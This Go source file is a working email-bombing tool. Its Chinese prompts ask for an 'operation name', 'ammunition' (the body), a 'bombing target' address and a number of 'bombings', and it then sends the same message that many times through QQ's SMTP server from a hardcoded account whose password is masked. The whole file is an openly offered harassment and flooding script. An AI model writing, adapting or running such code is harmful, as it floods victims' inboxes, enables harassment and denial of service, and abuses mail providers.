package main

import (
	"fmt"
	"strings"
	"net/smtp"
)

func sendToMail(user, password, host, to, subject, body, mailtype string) error {
	hp := strings.Split(host, ":")
	auth := smtp.PlainAuth("", user, password, hp[0])

	msg := []byte("To:" + to + "\nFrom: " + user + "<" +
        user + ">\nSubject: " + subject + "\n" + "\n\n" + body)
	send_to := strings.Split(to, ";")
	err := smtp.SendMail(host, auth, user, send_to, msg)
	return err
}


func sendEmail(subject, body string,n int,to string) {
	user := "1749511631@qq.com"
	pwd := "****************"
	host := "smtp.qq.com:25"
//	to := "1749511631@qq.com"
	fmt.Println("开始轰炸")
	for ;n>0;n--{
		err := sendToMail(user, pwd, host, to, subject, body, "html")
		if err != nil {
			fmt.Println("Send mail error!")
			fmt.Println(err)
			return
		}
	}
	fmt.Printf("成功!\n")
}

func main() {
	var n int
	var to,subject,body string
	fmt.Printf("输入作战名称:")
    fmt.Scanln(&subject)
    fmt.Printf("填装弹药:")
    fmt.Scanln(&body)
	fmt.Printf("请选择轰炸目标:")
	fmt.Scanln(&to)
	fmt.Printf("请选择轰炸次数:")
	fmt.Scanln(&n)
	sendEmail(subject,body,n,to)
}
